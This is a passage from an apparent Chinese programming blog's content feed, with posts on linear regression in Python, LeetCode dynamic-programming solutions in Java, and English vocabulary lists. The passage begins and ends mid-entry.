class="line"><span class="comment"># train the model</span></span><br><span class="line">LR_multi.fit(X_multi,y)</span><br></pre></td></tr></table></figure><h4 id="（3）模型预测-1"><a href="#（3）模型预测-1" class="headerlink" title="（3）模型预测"></a>（3）模型预测</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># make prediction</span></span><br><span class="line">y_predict_multi = LR_multi.predict(X_multi)</span><br><span class="line"><span class="built_in">print</span>(y_predict_multi)</span><br></pre></td></tr></table></figure><h4 id="（4）模型评估-1"><a href="#（4）模型评估-1" class="headerlink" title="（4）模型评估"></a>（4）模型评估</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># evaluate the model</span></span><br><span class="line">mean_squared_error_multi = mean_squared_error(y,y_predict_multi)</span><br><span class="line">r2_score_multi = r2_score(y,y_predict_multi)</span><br><span class="line"><span class="built_in">print</span>(mean_squared_error_multi,r2_score_multi)</span><br></pre></td></tr></table></figure><h4 id="（5）可视化预测结果-1"><a href="#（5）可视化预测结果-1" class="headerlink" title="（5）可视化预测结果"></a>（5）可视化预测结果</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># visualizing predict result</span></span><br><span class="line">fig_multi = plt.figure(figsize=(<span class="number">8</span>,<span class="number">5</span>))</span><br><span class="line">plt.scatter(y,y_predict_multi)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><img src="/blog/2539a3f8.html/image-20221112002817697.png" style="zoom:67%;"><h3 id="5-规定因素值预测"><a href="#5-规定因素值预测" class="headerlink" title="5. 规定因素值预测"></a>5. 规定因素值预测</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X_test = [<span class="number">65000</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">30000</span>,<span class="number">200</span>]</span><br><span class="line">X_test = np.array(X_test).reshape(<span class="number">1</span>,-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(X_test)</span><br><span class="line"></span><br><span class="line">y_test_predict = LR_multi.predict(X_test)</span><br><span class="line"><span class="built_in">print</span>(y_test_predict)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode_最长回文子串</title>
      <link href="/blog/f7f91f40.html/"/>
      <url>/blog/f7f91f40.html/</url>
      
        <content type="html"><![CDATA[<h1 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a>最长回文子串</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给你一个字符串 <code>s</code>，找到 <code>s</code> 中最长的回文子串。</p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;babad&quot;</span><br><span class="line">输出：&quot;bab&quot;</span><br><span class="line">解释：&quot;aba&quot; 同样是符合题意的答案。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">输入：s = &quot;cbbd&quot;</span><br><span class="line">输出：&quot;bb&quot;</span><br></pre></td></tr></table></figure><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><ul><li><code>1 &lt;= s.length &lt;= 1000</code></li><li><code>s</code> 仅由数字和英文字母组成</li></ul><h2 id="动态规划图解"><a href="#动态规划图解" class="headerlink" title="动态规划图解"></a>动态规划图解</h2><img src="/blog/f7f91f40.html/image-20221111171416473.png" style="zoom:50%;"><h2 id="算法实现"><a href="#算法实现" class="headerlink" title="算法实现"></a>算法实现</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> leetCode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: Rupert Tears</span></span><br><span class="line"><span class="comment"> * Date: Created in 15:42 2022/11/11</span></span><br><span class="line"><span class="comment"> * Description: Thought is already is late, exactly is the earliest time.</span></span><br><span class="line"><span class="comment"> * 给你一个字符串 s，找到 s 中最长的回文子串。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入：s = &quot;babad&quot;</span></span><br><span class="line"><span class="comment"> * 输出：&quot;bab&quot;</span></span><br><span class="line"><span class="comment"> * 解释：&quot;aba&quot; 同样是符合题意的答案。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 输入：s = &quot;cbbd&quot;</span></span><br><span class="line"><span class="comment"> * 输出：&quot;bb&quot;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 1 &lt;= s.length &lt;= 1000</span></span><br><span class="line"><span class="comment"> * s 仅由数字和英文字母组成</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Aigo_005</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;babad&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;cbbd&quot;</span>;</span><br><span class="line">        System.out.println(longestPalindrome(str1));</span><br><span class="line">        System.out.println(longestPalindrome(str2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Author: Rupert-Tears</span></span><br><span class="line"><span class="comment">     * CreateTime: 15:51 2022/11/11</span></span><br><span class="line"><span class="comment">     * Description: 利用动态规划解决</span></span><br><span class="line"><span class="comment">     * 枚举所有的可能；作图二维表格</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">longestPalindrome</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="comment">// 特殊情况</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> str.length();</span><br><span class="line">        <span class="comment">// 单个字符为回文串</span></span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">maxlen</span> <span class="operator">=</span> <span class="number">1</span>; <span class="comment">// 最大长度</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">begin</span> <span class="operator">=</span> <span class="number">0</span>;  <span class="comment">// 开始下标</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 构建动态规划二维表格</span></span><br><span class="line">        <span class="type">boolean</span>[][] dp = <span class="keyword">new</span> <span class="title class_">boolean</span>[len][len];</span><br><span class="line">        <span class="comment">// 获取字符数组</span></span><br><span class="line">        <span class="type">char</span>[] chars = str.toCharArray();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对角线均为回文串，并不影响程序结果</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            dp[i][i] = <span class="literal">true</span>;    <span class="comment">// 表示为回文串</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从2位数开始判断(对角线上侧)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; len; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; j; i++) &#123;</span><br><span class="line">                <span class="comment">// 判断首尾字符是否相等</span></span><br><span class="line">                <span class="keyword">if</span> (chars[i] != chars[j]) &#123;</span><br><span class="line">                    dp[i][j] = <span class="literal">false</span>;   <span class="comment">// 表示非回文串</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">// 首尾相等</span></span><br><span class="line">                    <span class="keyword">if</span> (j - i &lt;= <span class="number">2</span>) &#123;     <span class="comment">// 例如: aba aa b</span></span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        dp[i][j] = dp[i + <span class="number">1</span>][j - <span class="number">1</span>];    <span class="comment">// 赋值内部子串 boolean值</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 记录回文串起始位置及长度</span></span><br><span class="line">                <span class="keyword">if</span> (dp[i][j] &amp;&amp; j - i + <span class="number">1</span> &gt; maxlen) &#123;</span><br><span class="line">                    maxlen = j - i + <span class="number">1</span>;</span><br><span class="line">                    begin = i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str.substring(begin, begin + maxlen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h2><ul><li>时间复杂度：<em>O</em>(N<sup>2</sup>)，这里 N 是字符串的长度；</li><li>空间复杂度：<em>O</em>(N<sup>2</sup>)，使用一张二维表记录所有的可能性。</li></ul><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul><li>回文天然具备<code>状态转移</code>性质：一个长度严格大于<code>2</code>的回文串，去掉首位后仍然是回文串。</li><li>根据状态转移方程进行分类讨论。</li><li>考虑是否可用使用动态规划的思想去解决问题，首先要对问题的特征进行分析，是否能拆解为一个个的小问题，自底而上的解决。是否能抽离出 状态转移方程 ，从而进行分类讨论，解决问题。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业词汇积累007</title>
      <link href="/blog/bb5ed231.html/"/>
      <url>/blog/bb5ed231.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Professional-Vocabulary-Accumulation-007"><a href="#Professional-Vocabulary-Accumulation-007" class="headerlink" title="Professional Vocabulary Accumulation_007"></a>Professional Vocabulary Accumulation_007</h1><ul><li>Grief is a complex emotion</li><li>悲伤是一种复杂的感情</li><li>that, as you konw, deals on its own terms.</li><li>正如你所知，有它自己的应对方式。</li><li>there is no “practice makes perfect.”</li><li>没有孰能生巧这一说法</li><li>Strength without faith means nothing</li><li>没有信仰的力量毫无意义</li><li>we need to have faith that we can get throught this together.</li><li>我们要有信心，相信我们能一起度过难关。</li></ul><hr><ul><li>palindrome</li><li>回文</li><li>Visualizing Data</li><li>可视化数据</li><li>linear regression model </li><li>回归模型</li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业词汇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 专业词汇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业词汇积累006</title>
      <link href="/blog/cc59e2a7.html/"/>
      <url>/blog/cc59e2a7.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Professional-Vocabulary-Accumulation-006"><a href="#Professional-Vocabulary-Accumulation-006" class="headerlink" title="Professional Vocabulary Accumulation_006"></a>Professional Vocabulary Accumulation_006</h1><ul><li>Dynamic programing</li><li>动态规划</li><li>Using an Alternate Config</li><li>使用代替配置</li><li>Site</li><li>网站</li><li>URL（Uniform Resource Locator）</li><li>统一资源定位器</li><li>directory</li><li>目录</li><li>writing</li><li>文章、作品</li><li>category &amp; tag</li><li>分类和标签</li><li>home page setting</li><li>首页设置</li><li>Date&#x2F;Time format</li><li>日期&#x2F;时间格式</li><li>pagination</li><li>页码</li><li>extension</li><li>扩展</li><li>Alternate theme config</li><li>备选主题设置</li><li>include&#x2F;exclude files or folders</li><li>包括&#x2F;排除文件或文件夹</li><li>back to top</li><li>回到顶部</li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业词汇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 专业词汇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态规划</title>
      <link href="/blog/a80d0031.html/"/>
      <url>/blog/a80d0031.html/</url>
      
        <content type="html"><![CDATA[<h1 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h1><h2 id="一：什么是动态规划？"><a href="#一：什么是动态规划？" class="headerlink" title="一：什么是动态规划？"></a>一：什么是动态规划？</h2><p>动态规划是运筹学的一个分支，是求解策略过程最优化的过程。</p><p>动态规划并不是一种算法，而是一种思想，或者说策略。</p><p>动态规划可以达到最优的 O(n<sup>2</sup>) 复杂度。</p><h2 id="二：基本思想"><a href="#二：基本思想" class="headerlink" title="二：基本思想"></a>二：基本思想</h2><p>将大问题分解为一个一个的小问题，将小问题逐个击破，大问题就解决了。</p><h2 id="三：实例"><a href="#三：实例" class="headerlink" title="三：实例"></a>三：实例</h2><p>假设有一个可容纳4kg商品的购物篮，现有四件商品可供选择，如何装购物篮的价值最高？</p><h3 id="枚举法"><a href="#枚举法" class="headerlink" title="枚举法"></a>枚举法</h3><p><img src="/blog/a80d0031.html/image-20221106113912236.png"></p><p><img src="/blog/a80d0031.html/image-20221106114122176.png"></p><h3 id="动态规划-1"><a href="#动态规划-1" class="headerlink" title="动态规划"></a>动态规划</h3><p><img src="/blog/a80d0031.html/image-20221106113805329.png"></p><p><img src="/blog/a80d0031.html/image-20221106114230001.png"></p><p><img src="/blog/a80d0031.html/image-20221106114327468.png"></p><h3 id="启示"><a href="#启示" class="headerlink" title="启示"></a>启示</h3><ul><li>动态规划可以帮助我们<code>在给定约束条件下找到最优解</code>。在上面的问题中，你必须在购物篮容量给定的情况下，拿到价值最高的商品。</li><li><code>在问题可分解为彼此独立且离散的子问题时</code>，就可以采用动态规划来解决。</li><li><code>每种动态规划解决方案都涉及网格</code></li><li><code>表格中的值通常就是要优化的值</code>。在上面的问题中，表格的值为商品的价值。</li><li><code>每个表格都是一个子问题</code>，因此你应该考虑如何将问题分成子问题，这样有助于找出网格的坐标轴。</li></ul><h2 id="四：动态规划的应用"><a href="#四：动态规划的应用" class="headerlink" title="四：动态规划的应用"></a>四：动态规划的应用</h2><ul><li>最短路径（弗洛伊德算法）</li><li>库存管理</li><li>资源分配</li><li>设备更新</li><li>排序</li><li>装载</li></ul><h2 id="五：策略"><a href="#五：策略" class="headerlink" title="五：策略"></a>五：策略</h2><ul><li>没有放之四海皆准的公式，有的只是解决问题的方式。</li><li>动态规划，并非无所不能，具体问题具体分析，选择合适的策略，才是最好的。</li><li>自底而上的考虑问题，从最简单的情况出发，将大问题拆解为小问题，解决小问题，从而化解大问题。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法思想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>专业词汇积累005</title>
      <link href="/blog/5550b31d.html/"/>
      <url>/blog/5550b31d.html/</url>
      
        <content type="html"><![CDATA[<h1 id="Professional-Vocabulary-Accumulation-005"><a href="#Professional-Vocabulary-Accumulation-005" class="headerlink" title="Professional Vocabulary Accumulation_005"></a>Professional Vocabulary Accumulation_005</h1><ul><li>Reshape you data </li><li>either using array.reshape(-1,1) if you data has a single feather </li><li>or array.reshape(1,-1) if it contains a single sample.</li><li>如果数据只有一个要素，则使用 array.reshape(-1,1)重塑数据；</li><li>如果数据包含单个样本，则使用 array.reshape(1,-1)重塑数据。</li></ul><hr><ul><li>Professional</li><li>专业的</li><li>Vocabulary</li><li>词汇</li><li>Accumulation</li><li>积累</li><li>Repository</li><li>仓库</li><li>Memorable</li><li>难忘的</li><li>Inspiration</li><li>灵感</li><li>Optional</li><li>可选择的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 专业词汇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 专业词汇 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单因子线性回归</title>
      <link href="/blog/e0f9d9f4.html/"/>
      <url>/blog/e0f9d9f4.html/</url>
      
        <content type="html"><![CDATA[<h1 id="单因子线性回归"><a href="#单因子线性回归" class="headerlink" title="单因子线性回归"></a>单因子线性回归</h1><h2 id="一：LR实现线性预测"><a href="#一：LR实现线性预测" class="headerlink" title="一：LR实现线性预测"></a>一：LR实现线性预测</h2><p>任务：</p><ol><li>基于data.csv数据，建立线性回归模型。</li><li>预测 x&#x3D;3.5 对应的 y 值。</li><li>评估模型表现。</li></ol><h2 id="二：实现流程"><a href="#二：实现流程" class="headerlink" title="二：实现流程"></a>二：实现流程</h2><ol><li>建立线性回归模型<ol><li>导入数据，查看数据</li><li>数据赋值，查看数据类型</li><li>可视化数据</li><li>建立 Linear Regression 模型</li><li>根据需求重塑数据</li><li>模型训练</li></ol></li><li>数据预测<ol><li>查看预测结果</li><li>对指定值进行预测</li></ol></li><li>评估模型表现<ol><li>通过 Excel 获取数据关系</li><li>计算MSE值，进行评估</li><li>计算R2值，进行评估</li><li>可视化展示预测值与期望值关系</li></ol></li></ol><h2 id="三：代码实现"><a href="#三：代码实现" class="headerlink" title="三：代码实现"></a>三：代码实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一步：导入数据，查看数据</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">data = pd.read_csv(<span class="string">&quot;data.csv&quot;</span>)</span><br><span class="line">data.head()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：数据赋值</span></span><br><span class="line">x = data.loc[:,<span class="string">&#x27;x&#x27;</span>]</span><br><span class="line">y = data.loc[:,<span class="string">&#x27;y&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看数据类型</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x),x.shape)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(y),y.shape)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三步：可视化数据</span></span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.figure(figsize=(<span class="number">2</span>,<span class="number">2</span>)) <span class="comment"># 设置图形大小</span></span><br><span class="line">plt.scatter(x,y) <span class="comment"># 绘制散点图</span></span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第四步：建立 Linear Regression 模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line">lr_model = LinearRegression()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 数据重塑</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = np.array(x)</span><br><span class="line">x = x.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">y = np.array(y)</span><br><span class="line">y = y.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x),x.shape)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(y),y.shape)</span><br><span class="line"></span><br><span class="line">lr_model.fit(x,y) <span class="comment"># 模型训练</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第五步：预测数据</span></span><br><span class="line">y_predict = lr_model.predict(x)</span><br><span class="line"><span class="built_in">print</span>(y_predict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第六步：评估模型表现</span></span><br><span class="line">a = lr_model.coef_</span><br><span class="line">b = lr_model.intercept_</span><br><span class="line"><span class="built_in">print</span>(a,b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过 excel 获取，y = 2x</span></span><br><span class="line"><span class="comment"># 通过 MSE 和 R2 进行评估</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> mean_squared_error,r2_score</span><br><span class="line">MSE = mean_squared_error(y,y_predict)</span><br><span class="line">R2 = r2_score(y,y_predict)</span><br><span class="line"><span class="built_in">print</span>(MSE,R2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 展示</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.plot(y,y_predict)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="四：模型评估"><a href="#四：模型评估" class="headerlink" title="四：模型评估"></a>四：模型评估</h2><h3 id="Excel-结果"><a href="#Excel-结果" class="headerlink" title="Excel 结果"></a>Excel 结果</h3><p><img src="/blog/e0f9d9f4.html/image-20221105163228900.png"></p><h3 id="MSE-与-R2结果"><a href="#MSE-与-R2结果" class="headerlink" title="MSE 与 R2结果"></a>MSE 与 R<sup>2</sup>结果</h3><h3 id><a href="#" class="headerlink" title></a><img src="/blog/e0f9d9f4.html/image-20221105163237445.png"></h3>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 人工智能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode_寻找两个正序数组的中位数</title>
      <link href="/blog/31cc2bde.html/"/>
      <url>/blog/31cc2bde.html/</url>
      
        <content type="html"><![CDATA[<h1 id="寻找两个正序数组的中位数"><a href="#寻找两个正序数组的中位数" class="headerlink" title="寻找两个正序数组的中位数"></a>寻找两个正序数组的中位数</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个大小分别为 <code>m</code> 和 <code>n</code> 的正序（从小到大）数组 <code>nums1</code> 和 <code>nums2</code>。请你找出并返回这两个正序数组的 <strong>中位数</strong> 。</p><p>算法的时间复杂度应该为 <code>O(log (m+n))</code> 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">示例 1：</span><br><span class="line"></span><br><span class="line">输入：nums1 = [1,3], nums2 = [2]</span><br><span class="line">输出：2.00000</span><br><span class="line">解释：合并数组 = [1,2,3] ，中位数 2</span><br><span class="line">示例 2：</span><br><span class="line"></span><br><span class="line">输入：nums1 = [1,2], nums2 = [3,4]</span><br><span class="line">输出：2.50000</span><br><span class="line">解释：合并数组 = [1,2,3,4] ，中位数 (2 + 3) / 2 = 2.5</span><br></pre></td></tr></table></figure><h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a><strong>提示</strong></h2><ul><li><code>nums1.length == m</code></li><li><code>nums2.length == n</code></li><li><code>0 &lt;= m &lt;= 1000</code></li><li><code>0 &lt;= n &lt;= 1000</code></li><li><code>1 &lt;= m + n &lt;= 2000</code></li><li><code>-106 &lt;= nums1[i], nums2[i] &lt;= 106</code></li></ul><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span 